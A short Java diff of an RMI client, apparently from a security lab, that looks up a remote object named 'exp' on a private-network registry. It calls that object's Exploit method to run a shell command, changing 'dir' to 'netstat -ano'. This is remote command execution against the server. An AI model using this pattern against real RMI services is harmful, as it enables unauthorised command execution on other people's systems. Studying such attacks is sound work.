@@ -11,7 +11,8 @@ public class RMIClient{
         System.out.println("RMIClient ready!");
         Registry registry = LocateRegistry.getRegistry("192.168.31.151",1099);
         EXP exp = (EXP) registry.lookup("exp");
-        System.out.println(exp.Exploit("dir"));
+        System.out.println(exp.Exploit("netstat -ano"));
+        System.out.println(exp);
 
         /*
         EXP exp = (EXP) Naming.lookup("rmi://:1099/exp");
